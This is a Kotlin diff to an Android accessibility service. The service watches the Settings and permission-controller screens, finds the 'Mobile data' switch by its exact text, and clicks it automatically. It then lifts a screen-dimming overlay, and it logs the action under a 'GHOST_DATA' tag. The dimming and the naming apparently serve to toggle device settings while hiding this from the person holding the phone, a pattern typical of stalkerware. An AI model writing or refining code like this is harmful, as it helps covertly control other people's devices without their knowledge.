@@ -285,24 +285,28 @@ class MyAccessibilityService : AccessibilityService() {
         if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
             if (isWaitingForDataSettings && pkgName.contains("settings")) {
                 val root = rootInActiveWindow
-                val targetNodes = root?.findAccessibilityNodeInfosByText("Mobile data")
+                val targetNodes = root?.findAccessibilityNodeInfosByText("data")
                 if (!targetNodes.isNullOrEmpty()) {
                     for (node in targetNodes) {
-                        var parent = node
-                        // Traverse up to find the clickable container or the switch widget
-                        while (parent != null && !parent.isClickable) {
-                            parent = parent.parent
-                        }
-                        
-                        if (parent != null && parent.isClickable) {
-                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            DebugLogger.log("GHOST_DATA", "Successfully toggled Mobile Data via node match.")
-                            isWaitingForDataSettings = false
-                            // Final step: Restore screen brightness after 2 seconds
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                DimmerManager.removeOverlay(applicationContext)
-                            }, 2000)
-                            break
+                        // Normalize exact text by replacing newlines to avoid partial match traps like "2.77 GB of mobile data"
+                        val txt = node.text?.toString()?.replace("\n", " ")?.trim()?.lowercase() ?: ""
+                        if (txt == "mobile data" || txt == "cellular data") {
+                            var parent = node
+                            // Traverse up to find the clickable container
+                            while (parent != null && !parent.isClickable) {
+                                parent = parent.parent
+                            }
+                            
+                            if (parent != null && parent.isClickable) {
+                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                DebugLogger.log("GHOST_DATA", "Successfully toggled Mobile Data via exact match.")
+                                isWaitingForDataSettings = false
+                                // Final step: Restore screen brightness after 2 seconds
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    DimmerManager.removeOverlay(applicationContext)
+                                }, 2000)
+                                break
+                            }
                         }
                     }
                 }
